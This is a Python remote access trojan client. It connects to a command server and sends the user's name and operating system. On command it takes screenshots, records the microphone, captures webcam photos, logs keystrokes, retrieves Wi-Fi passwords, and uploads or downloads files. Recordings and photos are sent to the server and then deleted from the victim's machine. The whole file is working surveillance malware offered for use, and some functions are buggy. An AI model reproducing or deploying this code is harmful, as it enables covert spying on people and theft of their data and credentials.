import pygame, platform, time
import socket, os, pwd, logging
import pyaudio, wave, sys, cv2
import pygame.camera, subprocess, threading
from pynput.keyboard import Key, Listener
from subprocess import *
from tkinter import *
from array import array
import pyautogui
pygame.camera.init()
cam = pygame.camera.Camera("/dev/video0",(640,480))
try :
	cap = cv2.VideoCapture(0)
except Exception:
	cap = cv2.VideoCapture(1)
def on_press(key):
	logging.info(key)
class commands():
	def __init__(self):
		self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.s.connect(("127.0.0.1",9999))
		username = pwd.getpwuid( os.getuid() ).pw_name
		operating_system = platform.platform()
		self.s.send((username + " " + operating_system ).encode("utf-8"))
		self.stop = False
	def play_wav_files(self, filename):
		if len(sys.argv) < 2:
		    sys.exit(-1)
		self.wf = wave.open(filename, 'rb')
		self.p = pyaudio.PyAudio()
		stream = self.p.open(format=self.p.get_format_from_width(self.wf.getsampwidth()),
		                channels=self.wf.getnchannels(),
		                rate=self.wf.getframerate(),
		                output=True,
		                stream_callback=self.callback)
		stream.start_stream()
		while stream.is_active():
		    time.sleep(0.1)
		stream.stop_stream()
		stream.close()
		wf.close()
		p.terminate()
	def callback(self, in_data, frame_count, time_info, status):
	    data = self.wf.readframes(frame_count)
	    return (data, pyaudio.paContinue)
	def record_voise(self):
		CHUNK = 1024
		FORMAT = pyaudio.paInt16
		CHANNELS = 2
		RATE = 44100
		RECORD_SECONDS = int(self.s.recv(1024).decode("utf-8"))
		WAVE_OUTPUT_FILENAME = "output.wav"

		p = pyaudio.PyAudio()

		stream = p.open(format=FORMAT,
		                channels=CHANNELS,
		                rate=RATE,
		                input=True,
		                frames_per_buffer=CHUNK)
		frames = []
		for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
		    data = stream.read(CHUNK)
		    frames.append(data)
		stream.stop_stream()
		stream.close()
		p.terminate()
		wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
		wf.setnchannels(CHANNELS)
		wf.setsampwidth(p.get_sample_size(FORMAT))
		wf.setframerate(RATE)
		wf.writeframes(b''.join(frames))
		wf.close()
		with open(WAVE_OUTPUT_FILENAME, 'rb') as f:
			self.s.send(f.read())
		try :
			os.system("sudo rm -rf {0}".format(WAVE_OUTPUT_FILENAME))    
		except Exception:
			os.system("del {0}".format(WAVE_OUTPUT_FILENAME))
	def display_image(self,image_file_name):
		w = Tk()
		photo = PhotoImage(file=image_file_name)
		bg = Label(w, image=photo,bg="#000000")
		bg.pack()
		w.mainloop()

	def receive_files_from_server(self):
		file_name = self.s.recv(1024).decode("utf-8")
		try :
			os.system("touch {0}".format(file_name))
		except Exception as e:
			print(e)
		with open(file_name, 'wb') as f:
			f.write(self.s.recv(1024 * 10000 * 100))

	def send_files_to_server(self,file_name):
		self.s.send(file_name.encode("utf-8"))
		with open(file_name,'rb') as f:
			self.s.send(f.read())

	def get_wifi_password(self):
		pipe = Popen("wifiPassword", shell=True, stdout=PIPE).stdout
		output = pipe.read()
		output = output.decode("utf-8")
		password = output.split(":")[1]
		self.s.send(password.encode("utf-8"))
	
	def take_screenshot(self):
		pic = pyautogui.screenshot()
		time_array = time.ctime().split(' ')
		f = ""
		for i in time_array:
			f = f + i
		pic.save('{0}.png'.format(f))

	def start_key_logger(self, log_dir=""):
		if not self.stop:
			logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
			with Listener(on_press=on_press) as listener:
				listener.join()

	def open_link(self, url):
		#if sys.platform=='win32':
		 #   os.startfile(url)
		#elif sys.platform=='darwin':
		 #   subprocess.Popen(['open', url])
		#else:
		try:
		    os.system('xdg-open {0}'.format(url))
		except OSError:
		    print ('Please open a browser on: '+url)

	def take_picture(self, filename="picture.png"):
		ret, frame = cap.read()
		cv2.imwrite(filename,frame)
		cap.release()
		cv2.destroyAllWindows()
		with open(filename,"rb") as f:
			self.s.send(f.read())
		try:
			os.system("rm -rf {0}".format(filename))
		except Exception as e:
			os.system("del {0}".format(filename))


	def main_handler(self):
		while 1 :
			command = self.s.recv(1024).decode("utf-8")
			if command == "Screenshot" or command == "screenshot":
				self.take_screenshot()
			elif command == "Listen" or command == "listen":
				self.record_voise()
			elif command == "Cam_Discover":
				self.take_picture()
			elif command == "Wifi_Password" or command == "wifi_password":
				self.get_wifi_password()
			elif command == "Listen_For_Keys":
				self.stop = False
				threading.Thread(target=self.start_key_logger).start()
			elif command == "stop_key_logger":
				self.stop = True
			elif "Open_Link" in command or "open_link" in command:
				link = self.s.recv(1024 * 10)
				link = link.decode("utf-8")
				self.open_link(link)
			elif "Show_Image" in command or "show_image" in command:
				image_file = self.s.recv(1024 * 10)
				image_file = image_file.decode("utf-8")
				self.display_image(image_file)
			elif "Upload_File" in command or "upload_file" in command:
				self.receive_files_from_server()
			elif "Download" in command or "download" in command:
				d_file = self.s.recv(1024 * 10)
				d_file = d_file.decode("utf-8")
				self.send_files_to_server(d_file)







commands().main_handler()#.take_picture() #.open_link("https://www.youtube.com/")#.start_key_logger(#start that function and i mean the function 'start_key_logger()' as thread beause its a keylogger) #.get_wifi_password() #.send_files_to_server("BG.png") #.receive_files_from_server() #.display_image("app_bg.png")#play_wav_files(sys.argv[1]) #.record_voise() #.take_picture()